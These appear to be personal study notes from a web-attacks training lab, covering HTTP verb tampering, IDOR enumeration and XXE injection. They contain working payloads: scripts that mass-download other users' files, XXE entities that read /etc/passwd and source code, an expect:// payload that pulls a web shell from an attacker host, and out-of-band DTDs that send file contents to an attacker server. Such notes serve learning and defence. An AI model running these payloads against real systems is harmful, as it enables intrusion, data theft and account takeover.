## HTTP Verb Tampering

### Bypassing Basic Authentication

#### Determine which HTTP methods are accepted
```Shell
curl -i -X OPTIONS http://SERVER_IP:PORT/directory/page.ext
```

#### Intercept a request to a page you don't have access to and modify the request type
![[Pasted image 20230213115243.png]]
Forward the request

### Bypassing Security Filters
Example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters (e.g.` $_POST['parameter']`), it may be possible to bypass it by simply changing the request method to `GET`.

#### Intercept a request in Burp and modify the request method
![[Pasted image 20230213120824.png]]

#### Confirm the bypass by injecting a command that creates two files and then check whether both files were created (for a Command Injection vulnerability)
![[Pasted image 20230213120952.png]]

#### Intercept in Burp and modify
![[Pasted image 20230213121009.png]]
Right click and select "Change Request Method"

## IDOR

### IDOR Locations
- In URL parameters & APIs
- In AJAX Calls
- By understanding reference hashing/encoding
- By comparing user roles

#### URL Parameters & APIs
```url
?uid=1
```

```url
?filename=file_1.pdf
```
Mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

Try incrementing the data (e.g., `?filename=file_2.pdf`)

#### AJAX Calls
`Example`:
```JavaScript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

#### Hashing/Encoding
```url
?filename=ZmlsZV8xMjMucGRm
```
Decode and re-encode to base64 to search other potential file locations

Looking at a hashed reference (e.g., `download.php?filename=c81e728d9d4c2f636f067f89cc14862c`), you can search the source to see what might be referenced in the hash:
```JavaScript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
In this case, we can see that code uses the `filename`and hashing it with` CryptoJS.MD5`. Can also try to manually identify the hashing algorithm and then hash the filename to see if it matches the used hash. 

#### Compare User Roles
We may need to register multiple users and compare their HTTP requests and object references.

Example:
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
We can try repeating the same API call while logged in as User2 to see if the web application returns anything

### Mass IDOR Enumeration

#### Click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, then click on any of the links to view their HTML source code
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

#### Pick any unique word to be able to grep the link of the file (e.g., `<li class='pure-tree_link'>`)
```Shell
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
```

#### Use `grep` to only get the document links
```Shell
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

#### Use a `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
	for link in $curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
		wget -q $url/$link
	done
done
```

***LAB Notes:*
Be sure to intercept the request and see what type of HTTP parameter is being used (e.g., POST vs GET)

### Bypassing Encoded References

#### Intercepting the request in Burp
![[Pasted image 20230213155126.png]]
It is sending `POST` request to `download.php`

#### Can utilize Burp Comparer and fuzz various values and then compare each to our hash to see if we find any matches

#### Function Disclosure
```JavaScript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
This function takes the UID and encodes it as base64 (`btoa`), then hashes it w/ MD5

#### Encoding the UID with the above algorithm
```Shell
echo -n 1 | base64 -w 0 | md5sum
```
*Tip: We are using the -n flag with echo, and the -w 0 flag with base64, to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash.*

#### Mass Enumeration of Encoded References
```Shell
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
`tr -d ' -'` removes any trailing characters

```bash
#!/bin/bash

for i in {1..10}; do
	for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
		curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
	done
done
```

***LAB Notes:*
Used the following bash script for a GET request to encode the UIDs in base64:
```bash
#!/bin/bash

url="138.68.164.196:30195"

for i in {1..20}; do
	for hash in $(echo -n $i | base64); do
		curl -s "$url/download.php?contract=$hash"
	done
done
```

The function to encode was the following:
```JavaScript
   function downloadContract(uid) {
      window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
    }
```

### IDOR in Insecure APIs

#### Identifying Insecure APIs
![[Pasted image 20230214105453.png]]
Intercept a `PUT` request. `PUT` requests are usually used in APIs to update item details, while `POST` is used to create new items, `DELETE` to delete items, and `GET` to retrieve item details. Of interest in the above request is `role`, both in the API call and the cookie.

#### Exploiting Insecure APIs
Actions that can be taken:
- Change our uid to another user's uid, such that we can take over their accounts
- Change another user's details, which may allow us to perform several web attacks
- Create new users with arbitrary details, or delete existing users
- Change our role to a more privileged role (e.g. admin) to be able to perform more actions
- Modifying the HTTP request method (e.g., `PUT` -> `POST`)

***LAB Notes:*

Intercepted Request
![[IDOR API intercept.png]]

Right clicked to change the request type and modified it to be a `GET` request. Then changed the URL to `/profile/api.php/profile/5`
![[IDOR API success.png]]

### Chaining IDOR Vulnerabilities

#### Once a page can be access with a `GET` request, we can look to modify anotehr user's details with a `PUT` request
![[Pasted image 20230214112442.png]]
![[Pasted image 20230214112516.png]]

After being able to update the profile, we can do things like modifying the email and doing a password reset. Another potential attack is placing an `XSS` payload in the '`about`' field.

#### Chaining Two IDOR Vulnerabilities
Enumerate user names using Burp Intruder using the `GET` disclosure vulnerability from the previous exercise.

If you know the role type for an admin, you can change your own role to be an admin.
![[Pasted image 20230214120457.png]]

Try to write a script that changes all users' email to an email you choose.. You may do so by retrieving their uuids and then sending a `PUT` request for each with the new email.


## XML Injection

### Local File Disclosure
![[Pasted image 20230216091712.png]]
What is displayed in the XML fields of the HTTP request will be displayed in the response

![[Pasted image 20230216091834.png]]
This confirms that we are dealing with a web application vulnerable to XXE. A non-vulnerable web application would display (`&company;`) as a raw value.

*Note: In the above example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the `DOCTYPE` was already declared in the XML request, we would just add the `ENTITY` element to it.*

*Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an online tool. If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.*

### Reading Sensitive Files

#### Add the SYSTEM keyword and define the external reference path after it
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
![[Pasted image 20230216092247.png]]
*Tip: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.*

### Reading Source Code

#### Using PHP Filters to output XML data in base64 encoding
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
![[Pasted image 20230216092706.png]]

### Remote Code Execution with XXE
Easiest methods:
- Steal SSH keys
- Steal hashes in a Windows-based web app

`PHP://expect` filter:
- Requires PHP `expect` module to be installed and enabled

#### Writing a basic PHP web shell and starting a python web server
![[Pasted image 20230216093346.png]]

#### Use the following XML code to execute a `curl` command that downloads our web shell into the remote server
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```
*Note: We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.*

***LAB Notes:*

1) Intercepted request
![[First intercept.png]]

2) Modified request
![[PHP wrapper.png]]

3) Decoded the base64 output
![[decoded.png]]

### Advanced File Disclosure

#### Advanced Exfiltration by wrapping the content of the external file reference with a CDATA tag and XML Parameter Entities
```Shell
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

#### Reference the external entity (`xxe.dtd`) and then print the `&joined;`
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>

<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```
![[Pasted image 20230216101227.png]]

### Error-Based XXE

#### Send malformed XML data, and see if the web application displays any errors
![[Pasted image 20230216101429.png]]
Delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity

#### Host a DTD file
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Defines the `file` parameter entity and then joins it with an entity that does not exist

#### Call our external DTD script and reference the error entity
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
Calls `xxe` file from the Advanced File Disclosure section. *Make sure to start the python web server.*

This method may also be used to read the source code of files by changing the file name in our DTD script to point to the file we want to read (e.g. "`file:///var/www/html/submitDetails.php`"). However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it.

***LAB Notes:*

1) CDATA
![[adv file disclosure - cdata.png]]
Made the file on Kali, started the python web server, modified the DTD and email field

2) Error-based
![[error 1.png]]
Went to `/error` page. Modified `<root>` to `<roo>`, and the email field to `&nonExistingEntity;`

Created a dtd file on Kali (`xxe-error.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Started python web server

Modified Burp Request
![[adv file disclosure - error.png]]

### Blind Data Exfiltration - Out-of-Band (OOB)

#### Create a `.dtd` file that contains a php request for the content of the file we want to read and our python web server's IP address and port
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the file parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`.

#### Write a PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

#### Write the above PHP code to `index.php`, and then start a PHP server on port 8000
```Shell
php -S 0.0.0.0:8000
```

#### Use a similar payload to the one used in the error-based attack, adding `<root>&content;</root>`
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

#### Send the request to the web application
![[Pasted image 20230216110908.png]]
Go back to our terminal, and you will have the request and its decoded content

*Tip: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data*

### Blind Data Exfiltration - Automated OOB
[XXEinjector](https://github.com/enjoiz/XXEinjector)

#### Copy the HTTP request from Burp and write it to a file for the tool to use
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```
Do not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool

#### Run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read
```Shell
ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```
The tool did not directly print the data since we are base64 encoding the data. It will be stored in the `Logs` folder of the tool

#### Open the file stored in the `Logs` folder
```Shell
cat Logs/10.129.201.94/etc/passwd.log 
```

***LAB Notes:*

Manual
1) Made `xxe.dtd` and `index.php` files in Kali
2) Ran PHP web server
3) Modified intercepted Burp Request and sent it to the web application
![[blind request.png]]
4) Intercepted flag in PHP web server
![[blind flag.png]]

Automated
1) Created file for `XXEinjector` to read
![[autoblind.png]]
2) Executed `XXEinjector`
```Shell
ruby XXEinjector.rb --host=10.10.16.15 --httpport=8000 --file=autoblind.req --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter
```
![[xxeinjector.png]]
3) Opened file in `/Logs/10.129.67.225` folder
![[xxeinjectorflag.png]]
